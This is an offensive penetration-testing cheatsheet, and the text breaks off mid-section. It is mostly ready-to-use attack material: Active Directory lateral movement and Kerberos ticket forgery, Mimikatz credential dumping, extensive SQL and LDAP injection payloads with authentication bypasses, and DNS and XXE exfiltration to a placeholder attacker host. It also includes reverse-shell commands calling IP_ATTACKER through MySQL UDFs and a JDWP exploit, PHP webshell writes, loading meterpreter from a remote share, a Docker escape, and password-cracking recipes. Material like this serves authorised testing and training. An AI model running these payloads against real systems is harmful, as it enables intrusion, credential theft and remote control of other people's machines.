**Offensive cheatsheet**
- [Active Directory](#active-directory)
  - [Enumeration Active Directory](#enumeration-active-directory)
  - [Lateral Movement](#lateral-movement)
  - [Privilege Escalation Active Directory](#privilege-escalation-active-directory)
    - [Kerberos](#kerberos)
- [Applications](#applications)
  - [Apache](#apache)
  - [KeePass](#keepass)
  - [SQL Injection](#sql-injection)
    - [Automated Tools SQLi](#automated-tools-sqli)
    - [MySQL](#mysql)
    - [MSSQL](#mssql)
    - [Oracle SQL](#oracle-sql)
    - [SQLite](#sqlite)
  - [NoSQL Injection](#nosql-injection)
    - [MongoDB](#mongodb)
  - [PhpMyAdmin](#phpmyadmin)
  - [WordPress](#wordpress)
- [Container](#container)
  - [Docker](#docker)
- [File and Password Attacks](#file-and-password-attacks)
  - [Dictionary / Wordlist](#dictionary--wordlist)
  - [GIT](#git)
  - [Hash](#hash)
  - [Java](#java)
  - [JWT](#jwt)
  - [MD5](#md5)
  - [Metadata](#metadata)
  - [ZIP](#zip)
- [Linux Attacks](#linux-attacks)
  - [Enumeration Linux](#enumeration-linux)
  - [Privilege Escalation Linux](#privilege-escalation-linux)
  - [Persistence](#persistence)
- [Offensive Technique](#offensive-technique)
  - [buffer overflow](#buffer-overflow)
  - [File Transfer](#file-transfer)
  - [Phishing](#phishing)
  - [Port Forwarding](#port-forwarding)
  - [Reverse Shell](#reverse-shell)
- [Reconnaissance \& Services](#reconnaissance--services)
  - [Passive Recon](#passive-recon)
  - [Host Discovery](#host-discovery)
  - [Port Scanning](#port-scanning)
    - [UDP](#udp)
  - [Service Enumeration](#service-enumeration)
    - [DNS](#dns)
    - [FTP](#ftp)
    - [HTTP / HTTPS](#http--https)
    - [NFS](#nfs)
    - [RDP](#rdp)
    - [RPC](#rpc)
    - [SMB](#smb)
    - [SNMP](#snmp)
    - [SSH](#ssh)
    - [WinRM](#winrm)
- [Tools \& Automation](#tools--automation)
  - [Kali](#kali)
  - [Metasploit](#metasploit)
- [Web Vulnerabilities](#web-vulnerabilities)
  - [Command Injection](#command-injection)
  - [Deserialization](#deserialization)
  - [File Upload](#file-upload)
  - [LFI](#lfi)
  - [Object Relational Mapping (ORM) Injection](#object-relational-mapping-orm-injection)
  - [Prototype Pollution](#prototype-pollution)
  - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
  - [Waf Evasion](#waf-evasion)
    - [SQL Injection WAF Bypass](#sql-injection-waf-bypass)
  - [XXE](#xxe)
  - [XSS](#xss)
- [Windows Attacks](#windows-attacks)
  - [Enumeration Windows](#enumeration-windows)
  - [Evasion](#evasion)
  - [Privilege Escalation Windows](#privilege-escalation-windows)


--- 
## Active Directory

### Enumeration Active Directory
**Auto Enumeration Tools**

- [BloodHound/SharpHound](https://bloodhound.readthedocs.io/)
- [adPEAS](https://github.com/61106960/adPEAS)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [linWinPwn](https://github.com/lefayjey/linWinPwn)

**Manual Enumeration**
```powershell
# Domain info
Get-ADDomain | Select-Object -ExpandProperty DNSRoot
systeminfo | findstr Domain

# Users
net user /domain
Get-ADUser -Filter *
Get-ADUser -Identity <USERNAME> -Properties *

# Groups
net group /domain
Get-ADGroup -Identity Administrators

# Computers
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem | Format-List name, ipv4*, oper*

# SPN Enumeration
setspn -L <SERVICE>
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Shares
Find-DomainShare
ls \\<DC>\sysvol\<DOMAIN>

# ACLs
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

# Sessions
Get-NetSession -ComputerName <HOST> -Verbose
.\PsLoggedon.exe \\<HOST>
```
---
**Linux Enumeration Active Directory**
```bash
ldapsearch -x -H ldap://<DC_IP>:389 -b "dc=<DOMAIN>,dc=<TLD>" "(ou=People)"
ldapsearch -v -x -b "DC=<DOMAIN>,DC=<TLD>" -H "ldap://<DC_IP>" "(objectclass=*)" | grep sAMAccountName
```
### Lateral Movement
```powershell
# WinRS
winrs -r:<HOST> -u:<USERNAME> -p:<PASSWORD> "<COMMAND>"

# WMIC
$username = '<USERNAME>'
$password = '<PASSWORD>'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$Session = New-CimSession -ComputerName <TARGET_IP> -Credential $credential
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine ="<COMMAND>"}

# PsExec
.\PsExec64.exe -i \\<HOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd

# DCOM
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <COMMAND>","7")
```
---
**LDAP Injection**
script blind LDAP injection
```python
import requests
from bs4 import BeautifulSoup
import string
import time
# Base URL
url = 'http://IP_VICTIM/blind.php'
# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"
# Initialize variables
successful_response_found = True
successful_chars = ''
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False
    for char in char_set:
        #print(f"Trying password character: {char}")
        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}
        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)
        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')
        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break
    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```


### Privilege Escalation Active Directory

**Mimikatz**
```powershell
privilege::debug
sekurlsa::logonpasswords
lsa::secrets
sekurlsa::tickets
sekurlsa::msv
lsadump::sam
token::elevate
token::revert
```
---
#### Kerberos

**AS-REP Roasting**
```bash
# Impacket (Linux)
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>

# Rubeus (Windows)
.\Rubeus.exe asreproast /nowrap

# Crack
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```
**Kerberoasting**
```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Impacket
sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>

# Crack
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
```
**Pass-the-Hash**
```bash
# Impacket
impacket-psexec -hashes <LM_HASH>:<NT_HASH> Administrator@<TARGET_IP>
impacket-wmiexec -hashes :<NT_HASH> Administrator@<TARGET_IP>

# Mimikatz
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NT_HASH> /run:powershell
```
**Pass-The-Ticket**
```powershell
# Export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt <TICKET_FILE>

# Verify
klist
```

**Golden Ticket**
```powershell
# Requirements: krbtgt hash, domain SID
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
misc::cmd
```

**Silver Ticket**
```powershell
# Get service NTLM hash
sekurlsa::logonpasswords

# Get user SID
whoami /user

# Create ticket
kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<SERVICE_HOST> /service:<SERVICE> /rc4:<NT_HASH> /user:<USERNAME>
```

**DC Sync**
```powershell
# Mimikatz
lsadump::dcsync /user:<DOMAIN>\<USERNAME>

# Impacket
impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>
```
**Overpass-the-Hash / Pass-the-Key**
```powershell
# Get Kerberos keys
sekurlsa::ekeys

# RC4 (equals NTLM)
sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:<HASH> /run:"<COMMAND>"

# AES256
sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:<HASH> /run:"<COMMAND>"
```
---
## Applications

### Apache

```bash
# APR-MD5 for authentication basic HTTP
hashcat -m 1600 .htpasswd
```

---

### KeePass

```bash
# Extract hash
keepass2john Database.kdbx > keepass.hash

# Crack with hashcat
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# 7zip — list archive contents (useful for inspecting KeePass backup archives)
7za l -slt <FILE>
```

---

### SQL Injection

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data they are not normally able to retrieve, including data belonging to other users or any data the application itself can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.
The first thing to do is find how to inject data without breaking the query, identify how to escape from the current context.

```bash
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

**Comments by database:**

```
MySQL:      #comment   -- comment   /*comment*/   /*! MYSQL Special SQL */
PostgreSQL: --comment  /*comment*/
MSSQL:      --comment  /*comment*/
Oracle:     --comment
SQLite:     --comment  /*comment*/
HQL:        (no comments supported)
```

**SQL Injection Types**

```sql
-- Error Based
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))

-- Union Based
SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin

-- Boolean Based Blind
SELECT * FROM users WHERE id = 1 AND 1=1
SELECT * FROM users WHERE id = 1 AND 1=2

-- Time Based
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
```
---
**Classic Payloads**

```sql
-- Basic injection tests
' or 1=1 --
' or '1'='1
' or 1=1 --+
<USERNAME>' or 1=1;#

-- Union based
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1,@@version,3 -- -
' UNION SELECT 1,user(),3 -- -

-- List databases
' UNION SELECT 1,2,3,4,5,group_concat(table_schema) FROM information_schema.tables -- -

-- Fetch table names
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables -- -

-- Fetch column names
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns -- -

-- Dump data
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users LIMIT 0,1 -- -
```
---
**Logical Operations**

> If `?username=Peter` returns the same as `?username=Peter' or '1'='1`, you found SQLi. Or if `?id=1` returns the same as `?id=2-1`, SQLi confirmed.

```bash
page.asp?id=1 or 1=1 --   # true
page.asp?id=1' or 1=1 --  # true
page.asp?id=1" or 1=1 --  # true
page.asp?id=1 and 1=2 --  # false
```
---
**Timing**

```bash
# MySQL
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

# PostgreSQL
1' || pg_sleep(10)

# MSSQL
1' WAITFOR DELAY '0:0:10'

# Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

# SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

> If sleep functions are blocked, use complex operations that take several seconds to execute.
---
**Identifying Back-end**

```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
---
**Union-Based Exploitation**
Detecting Number of Columns

**Method 1 — ORDER BY / GROUP BY:** Keep incrementing until you get a False response.

```bash
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False → 3 columns

1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False → 3 columns
```

**Method 2 — UNION SELECT null:** Add null values until the query succeeds.

```bash
1' UNION SELECT null-- -            Not working
1' UNION SELECT null,null-- -       Not working
1' UNION SELECT null,null,null-- -  Worked
```

> Use null values — they are valid in every column type.

**Extract Database, Table and Column Names**

```bash
# Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

# Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

# Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

**Error-Based Exploitation**

```bash
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
---
**Blind SQLi**

```bash
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

**Error Blind SQLi**

Force an SQL error each time you guess the correct character:

```bash
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

**Time-Based SQLi**

```bash
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
**Stacked Queries**

Executes multiple queries in succession — results are not returned, so this is primarily useful for blind vulnerabilities (DNS lookup, conditional error, time delay).

Oracle does NOT support stacked queries. MySQL, MSSQL, PostgreSQL support them:

```sql
QUERY-1-HERE; QUERY-2-HERE
```

**Out-of-Band Exploitation**

```bash
# Exfiltrate via DNS
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

**Out-of-Band via XXE**

```bash
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

**Authentication Bypass**

Use the first 200 payloads below as both username and password, then use the full list in the username field while putting a known password (e.g. `Pass1234.`) or known username (e.g. `admin`) in the other field.

**Raw MD5 Bypass**

When raw MD5 is used, the password is queried as a plain string, not a hex string:

```bash
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Craft a string with a `true` statement such as `' or 'SOMETHING`:

```
md5("ffifdyop", true) = 'or'6<garbage>
```

**Hash Authentication Bypass**

```bash
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

> Use as username each line of the list, password always: `Pass1234.`

```bash
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
```

**GBK Authentication Bypass**

If `'` is being escaped, use `%A8%27`. When `'` gets escaped it becomes: `0xA8 0x5c 0x27`

```bash
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

Python script:

```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password": "test"}
r = requests.post(url, data=datas, cookies=cookies, headers={'referrer': url})
print(r.text)
```

**Polyglot Injection (multicontext)**

```bash
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

**Insert Statement**

**Modify Password of Existing Object/User**

Try to create a new object named as the "master object" (e.g. `admin`):

- Create user named: `AdMIn` (mixed case)
- Create a user named: `admin=`
- SQL Truncation Attack (length limit) — create user: `admin[lots of spaces]a`

**MySQL Insert Time-Based Checking**

Add as many `','',''` as needed to exit the VALUES statement. If delay executes, you have SQLi:

```bash
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

**Extract Information Creating 2 Accounts Simultaneously**

```bash
# SQLi payload
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

# A new user is created: username=otherUsername, password=otherPassword, email=FLAG
```

**Routed SQL Injection**

The injectable query is not the one giving output — its output feeds into the query that does.

```bash
# Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

#### Automated Tools SQLi
**sqlmap**
```bash
# Basic scan
sqlmap -u http://<TARGET_IP>/page.php?id=1 -p "id" --dump
sqlmap -r post.txt -p <PARAM> --batch --os-shell --web-root "/var/www/html/tmp"

# Standard target with random agent
sqlmap -u target.com/test?id=10 -p id --random-agent --dbs

# Test all forms with default wizard answers
sqlmap -u target.com --forms --batch --crawl=10 --threads=10 --level=5 --risk=3

# Discover all parameters and pipe to sqlmap
python3 paramspider.py -d target.com -s TRUE -e woff,ttf,eot,svg | deduplicate --sort | sed '1,4d' | sqlmap

# Tip: use sqlmap + Burp via the sqlipy extension

# Advanced testing with tamper scripts
sqlmap -u "https://target.com/page.php?id=1" \
  --batch --random-agent \
  --tamper="between,space2comment,charencode" \
  --timeout=15 --time-sec=8 \
  --level=5 --risk=3
```

**Ghauri**
```bash
# Ghauri — automated testing with WAF bypass
ghauri -u "https://target.com/page.php?id=1" \
  --timeout=30 --delay=5 \
  --technique=BEST --level=3 \
  --prefix="/**/" --suffix="-- -" \
  --safe-chars="[]" --random-agent \
  --ignore-code=403
```
---
#### MySQL

Best tools: [JSQL](https://github.com/ron190/jsql-injection), HeidiSQL

```bash
# Access MySQL
mysql -u root -p'<PASSWORD>' -h <TARGET_IP> -P 3306

# MySQL commands
SELECT system_user();
SHOW DATABASES;
USE <DATABASE_NAME>;
SHOW TABLES;
SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
```


**`secure_file_priv` Restrictions**

```mysql
SHOW VARIABLES LIKE "secure_file_priv";
-- or
SHOW VARIABLES LIKE "plugin_dir";
```

**Results Interpretation:**
- `NULL` — File I/O disabled. UDF exploit is blocked.
- Specific path (e.g. `/var/lib/mysql-files/`) — Files can only be read/written in that directory.
- Empty `""` — No restrictions. Server is vulnerable to arbitrary file uploads.

Create UDF function ([exploit files](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)):

```mysql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('nc -e /bin/sh IP_ATTACKER PORT');
-- or
SELECT sys_exec('net user attacker password123 /add');
DROP FUNCTION sys_exec;
```
---

#### MSSQL

```bash
# Connect with Impacket
impacket-mssqlclient <USERNAME>:<PASSWORD>@<TARGET_IP> -windows-auth
```

```sql
-- MSSQL commands
EXECUTE xp_cmdshell 'whoami';
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
```

---
#### Oracle SQL 

Oracle SQL Default Databases

| Name   | Description              |
| ------ | ------------------------ |
| SYSTEM | Available in all versions |
| SYSAUX | Available in all versions |

Oracle SQL Comments

| Type  | Description |
| ----- | ----------- |
| `-- -` | SQL comment |

Oracle SQL Version

```sql
SELECT user FROM dual UNION SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
```

 Oracle SQL Hostname

```sql
SELECT host_name FROM v$instance;             -- Privileged
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
```

 Oracle SQL Database Name

```sql
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
```

Oracle SQL Database Credentials

| Query                                      | Description                  |
| ------------------------------------------ | ---------------------------- |
| `SELECT username FROM all_users;`          | Available on all versions     |
| `SELECT name, password from sys.user$;`    | Privileged, <= 10g            |
| `SELECT name, spare4 from sys.user$;`      | Privileged, <= 11g            |

Oracle SQL — List Objects

```sql
-- List databases
SELECT DISTINCT owner FROM all_tables;

-- List tables
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
```

 Oracle SQL Time-Based

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
```

 Oracle Java Execution

```sql
-- List Java privileges
select * from dba_java_policy;
select * from user_java_policy;

-- Grant privileges
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');

-- Execute commands (10g R2, 11g R1/R2) via DBMS_JAVA_TEST.FUNCALL()
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL;
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual;

-- Execute commands (11g R1/R2) via DBMS_JAVA.RUNJAVA()
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL;
```

---

#### SQLite 

```bash
# Comments
--
/**/

# Version
select sqlite_version();

# Extract database structure
SELECT sql FROM sqlite_schema;

# Extract table names
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';

# Extract column names
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name';

# Cleaner column output
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');

# Boolean — count tables
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table;

# Boolean — enumerate table name
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number;

# Boolean — extract info
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char');

# Boolean — error based
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END;

# Time based
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))));

# RCE — Attach Database (write PHP shell)
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--

# RCE — Load_extension (disabled by default)
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```


### NoSQL Injection

#### MongoDB 
**MongoDB Injection**
```bash
# Basic
user=admin&pass=<PASSWORD>&remember=on

# $nin injection
user[$nin][]=admin&user[$nin][]=<USER>&pass[$ne]=<PASSWORD>&remember=on

# Regex guessing
user=admin&pass[$regex]=^.{6}&remember=on
```

---

### PhpMyAdmin

**Upload Button via SQL**

Create a PHP file uploader through `INTO OUTFILE`:

```sql
SELECT
"<?php echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';echo '<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>'; if( $_POST['_upl'] == \"Upload\" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Done.<b><br><br>'; }else { echo '<b>Upload Failed.</b><br><br>'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

Then use the uploaded file to deploy a PHP webshell.

---

### WordPress

```bash
# WPScan — full enumeration
sudo wpscan --url https://<DOMAIN> \
  --random-user-agent \
  -e vp,vt,tt,cb,dbe \
  --disable-tls-checks \
  --plugins-detection aggressive \
  --api-token <API_TOKEN>

# WPScan — brute force
wpscan --url <TARGET_IP> -U <USERNAME> -P <WORDLIST>

# WordPress REST API enumeration
wp-json/wp/v2/users
wp-json/wp/v2/users/
/?rest_route=/
```

[WordPress reverse shell guide](https://www.golinuxcloud.com/set-up-wordpress-reverse-shell/)
## Container
---
### Docker
**Docker escape**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
## File and Password Attacks
### Dictionary / Wordlist
```bash
# Add numbers to end
sed -i 's/$/1/g' rockyou.txt

# CEWL
cewl www.<DOMAIN>.com -m 9 -w <DOMAIN>-cewl.txt

# Crunch
crunch 2 2 01234abcd -o crunch.txt

# CUPP https://github.com/Mebus/cupp

# Create rules hashcat
echo '$[0-9]' > demo.rule
hashcat -r demo.rule --stdout demo.txt
```
**John rules** 
best rules best64 or KoreLogic
```bash
sudo vim /etc/john/john.conf
[List.Rules:sg]
$[0-9]$[0-9]$[0-9]
 # or
$[0-9]$[0-9]$[0-9]$[0-9]$?s$?s
$[0-9]$[0-9]$[0-9]$[0-9]$[£!$@#%?.:^&()+_-={}|\[\]\;',/<>`~*]$[£!$@#%?.:^&()+_-={}|\[\]\;',/<>`~*]
# create a wordlist
john --wordlist=cewl.txt --rules=sg --stdout  > mutated.txt
john --wordlist=mutated.txt hash.txt
```
### GIT
```bash
# Download .git folder
wget -r -np http://<TARGET_IP>/.git/

# Git commands
git log                    # see log
git show <HASHCOMMIT>      # see diff commit
```
**GIT-Attack**
```bash
# Clone GitTools
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Dump .git directory
./Dumper/gitdumper.sh http://<TARGET_IP>/.git/ ./dump-target

# Extract files
./Extractor/extractor.sh ./dump-target ./extracted-files

# Analyze
cd ./extracted-files
git log
git show <HASH>
```

### Hash
identification:
```bash
hash-identifier
hashid
hashcat -b
# Hashcat modes
-a 0  # Dictionary attack
-m 0  # MD5

```

### Java
**Java RCE**
https://github.com/IOActive/jdwp-shellifier/tree/master
```bash
python2.7 jdwp-shellifier.py -t 127.0.0.1 -p 9000 --cmd "busybox nc IP_ATTACKER PORT -e bash"
```
### JWT
JWT [secrets list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```bash
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```

### MD5

```bash
# Basic md5 without salt
john hashfile --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```
### Metadata
```bash
# extract information
exiftool -a -u FILE.pdf

read every file
grep . FILE

```
### ZIP
```bash
zip2john archive.zip > hash.txt
